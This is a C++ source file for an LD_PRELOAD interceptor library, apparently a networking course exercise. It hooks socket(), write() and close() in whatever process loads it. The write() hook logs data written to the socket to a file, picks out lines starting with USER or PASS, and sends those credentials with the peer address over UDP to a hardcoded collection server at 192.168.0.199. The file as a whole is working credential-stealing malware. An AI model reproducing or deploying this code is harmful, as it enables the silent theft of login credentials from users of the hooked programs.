#define _GNU_SOURCE

//
// System calls interceptor for the networking spoiling...
//

extern "C"
{
#include <dlfcn.h>
#include <unistd.h>
}

#include <cstdio>
#include <cstdlib>
#include <ctime>

#include <fstream>

#include <arpa/inet.h>
#include <iomanip>

#include <iostream>
#include <cstring>

#include <socket_wrapper/socket_headers.h>
#include <socket_wrapper/socket_wrapper.h>
#include <socket_wrapper/socket_class.h>

static void init (void) __attribute__ ((constructor));

typedef ssize_t (*write_t)(int fd, const void *buf, size_t count);
typedef int (*socket_t)(int domain, int type, int protocol);
typedef int (*close_t)(int fd);

static close_t old_close;
static socket_t old_socket;
static write_t old_write;

static int socket_fd = -1;

// IP address server
char server_address[INET_ADDRSTRLEN] = "192.168.0.199";
// port server
static int server_port = 10000;

static sockaddr_in serv_addr;
static int sock = -1;

void init(void)
{
    srand(time(nullptr));
    printf("Interceptor library loaded.\n");

    old_close = reinterpret_cast<close_t>(dlsym(RTLD_NEXT, "close"));
    old_write = reinterpret_cast<write_t>(dlsym(RTLD_NEXT, "write"));
    old_socket = reinterpret_cast<socket_t>(dlsym(RTLD_NEXT, "socket"));

    std::ofstream file1;
    file1.open("interception.log");
    file1.close();

    inet_pton(AF_INET, server_address, &(serv_addr.sin_addr));
    serv_addr.sin_port = htons(server_port);
    serv_addr.sin_family = PF_INET;

    sock= old_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
//    connect(sock, reinterpret_cast<const sockaddr*>(&serv_addr), sizeof(serv_addr));
}

extern "C"
{

int close(int fd)
{
    if ( fd == socket_fd )
    {
        printf("> close() on the socket was called!\n");

        std::string cl = "Socket close\n";
        sendto(sock, cl.c_str(), cl.length(), 0,reinterpret_cast<const sockaddr *>(&serv_addr), sizeof(serv_addr));
        socket_fd = -1;
    }

    return old_close(fd);
}

ssize_t write(int fd, const void *buf, size_t count)
{
    auto char_buf = reinterpret_cast<const char*>(buf);

    if (char_buf && (count > 1) && (fd == socket_fd))
    {
        printf("> write() on the socket was called with a string!\n");
        std::ofstream file1;
        file1.open("interception.log", std::ios_base::out | std::ios_base::app);
        if (file1)
        {   // Тут нужна какая то блокировка mutex, чтобы успеть скинуть на диск, не успеваю
            std::string st(char_buf,count);
            file1 << char_buf;
            file1 << std::flush;
            file1.close();
        }

        char socket_adr[INET_ADDRSTRLEN] = "";
        struct sockaddr_in socket_adr_name;
        socklen_t socket_adr_name_len = sizeof(socket_adr_name);

        if (getpeername(fd, (struct sockaddr *)&socket_adr_name, &socket_adr_name_len) != 0)
        {
            perror("getpeername");
        } else
          {
            if (std::string(char_buf).find("USER") == 0 || std::string(char_buf).find("PASS") == 0)
            {
                inet_ntop(AF_INET, &socket_adr_name.sin_addr, socket_adr, sizeof socket_adr);

                std::string buff = "\nip="+ std::string(socket_adr);
                uint16_t adr_port = ntohs(socket_adr_name.sin_port);
                buff = buff + " port=" + std::to_string(adr_port)+'\n';
                buff = buff + std::string(char_buf,count);
                if (sock)
                {
                    sendto(sock, buff.c_str(), buff.length(), 0,reinterpret_cast<const sockaddr *>(&serv_addr), sizeof(serv_addr));
                }
             }
          }
    }
    return old_write(fd, buf, count);
}


int socket(int domain, int type, int protocol)
{
    int cur_socket_fd = old_socket(domain, type, protocol);

    if (-1 == socket_fd)
    {
        printf("> socket() was called, fd = %d!\n", cur_socket_fd);
        socket_fd = cur_socket_fd;
    }
    else
    {
        printf("> socket() was called, but socket was opened already...\n");
    }

    return cur_socket_fd;
}

} // extern "C"

